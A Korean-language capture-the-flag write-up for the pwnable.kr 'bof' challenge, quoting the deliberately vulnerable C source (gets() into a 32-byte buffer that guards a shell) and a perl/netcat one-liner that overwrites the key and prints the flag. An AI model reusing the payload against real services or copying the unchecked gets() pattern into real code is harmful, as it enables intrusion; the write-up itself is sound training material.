# [Toddler's Bottle] bof
bof에서 제공하는 글을 살펴보자.
```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```
이번 문제는 bof와 bof.c를 직접 다운하라고 한다.

bof.c를 다운해서 확인해본 결과 다음과 같은 코드가 나왔다.
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
이번 문제는 간단한 오버 플로우를 이용해서 deadbeef를 cafebabe로 바꿔주면 해결 할 수 있는 문제인것같다.

gdb를 통해 `overflowme`의 시작 주소가 `0xffffd28c`인 것을 알아냈고  
deadbeef가 들어있는 주소가 `0xffffd2c0`인 것을 알아냈다.

즉, 두 주소는 52바이트만큼 떨어져있으므로 52바이트를 아무 값이나 채워주고 나머지 4바이트를 cafebabe로 채워주면 해결할 수 있다.
```
root@okim:~/work# (perl -e 'print "a"x52,"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
a
cat flag
daddy, I just pwned a buFFer :)
```
